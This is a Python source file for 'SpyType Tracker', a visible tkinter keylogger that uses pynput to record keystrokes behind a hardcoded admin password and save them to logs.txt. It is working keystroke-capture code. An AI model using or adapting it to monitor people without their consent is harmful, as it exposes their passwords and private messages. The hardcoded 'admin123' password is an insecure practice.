
#SpyType Tracker - Keystrokes capturing

import tkinter as tk
from tkinter import messagebox, simpledialog
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SpyType Tracker-Keystrokes Capturing")

        self.admin_password = "admin123"  # Set your admin password here

        self.login_button = tk.Button(self.root, text="Login as Admin", command=self.login_as_admin, font=("Helvetica", 12))
        self.login_button.pack(pady=10)

        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger, state=tk.DISABLED, font=("Helvetica", 12))
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED, font=("Helvetica", 12))
        self.stop_button.pack(pady=10)

        self.status_label = tk.Label(self.root, text="Keylogger is not active", font=("Helvetica", 14, "italic"))
        self.status_label.pack(pady=15)

        self.key_list = []
        self.is_logging = False
        self.listener = None

    def login_as_admin(self):
        entered_password = simpledialog.askstring("Admin Login", "Enter Admin Password:", show='*')
        if entered_password == self.admin_password:
            self.status_label.config(text="Admin logged in")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.NORMAL)
            self.login_button.config(state=tk.DISABLED)
        else:
            messagebox.showerror("Login Failed", "Incorrect password. Try again.")

    def start_keylogger(self):
        if self.is_admin_logged_in():
            self.is_logging = True

            def on_press(key):
                if self.is_logging:
                    self.key_list.append(str(key))

            def on_release(key):
                if key == keyboard.Key.esc:
                    self.stop_keylogger()
                    return False

            self.listener = keyboard.Listener(on_press=on_press, on_release=on_release)
            self.listener.start()

            self.status_label.config(text="Keylogger is active")

    def stop_keylogger(self):
        if self.is_admin_logged_in():
            entered_password = simpledialog.askstring("Admin Password", "Enter Admin Password to Stop Keylogger:", show='*')
            if entered_password == self.admin_password:
                self.is_logging = False

                self.listener.stop()
                self.listener.join()

                with open('logs.txt', 'w') as log_file:
                    log_file.write('\n'.join(self.key_list))

                self.key_list = []
                self.status_label.config(text="Keylogger is not active")
                self.start_button.config(state=tk.DISABLED)
                self.stop_button.config(state=tk.DISABLED)
                self.login_button.config(state=tk.NORMAL)
            else:
                messagebox.showerror("Access Denied", "Incorrect admin password. Keylogger not stopped.")

    def is_admin_logged_in(self):
        if self.login_button["state"] == tk.DISABLED:
            return True
        else:
            messagebox.showerror("Access Denied", "Admin login required.")
            return False


root = tk.Tk()
root.geometry("400x400")  # Set the size of the window
keylogger_gui = KeyLoggerGUI(root)
root.mainloop()
